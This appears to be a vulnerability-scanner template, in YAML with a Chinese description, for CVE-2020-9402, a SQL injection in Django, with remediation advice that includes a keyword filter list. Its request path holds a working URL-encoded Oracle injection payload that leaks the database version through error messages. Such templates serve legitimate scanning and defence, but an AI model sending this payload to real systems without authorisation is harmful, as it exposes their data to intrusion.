id: CVE-2020-9402
info:
  name: Django SQL Injection
  author:
  - l0ne1y
  description: |-
    Django SQL注入漏洞
    Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。

    Django 1.11.29之前的1.11.x版本、2.2.11之前的2.2.x版本和3.0.4之前的3.0.x版本中存在SQL注入漏洞。攻击者可借助特制的SQL语句利用该漏洞查看、添加、修改或删除数据库中的信息。
  severity: high
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://www.djangoproject.com/weblog/2020/mar/04/security-releases/

    临时修复方案：
    1、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。
    2、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。
    3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。
    4、严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。
    5、避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。
    6、过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。
requests:
- matchers:
  - type: word
    condition: and
    words:
    - DatabaseError at
    - 'ORA-29257:'
    - 'ORA-06512:'
    - 'Request Method:'
  path:
  - '{{BaseURL}}/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20%20OR%20(1%2B1'
  method: GET
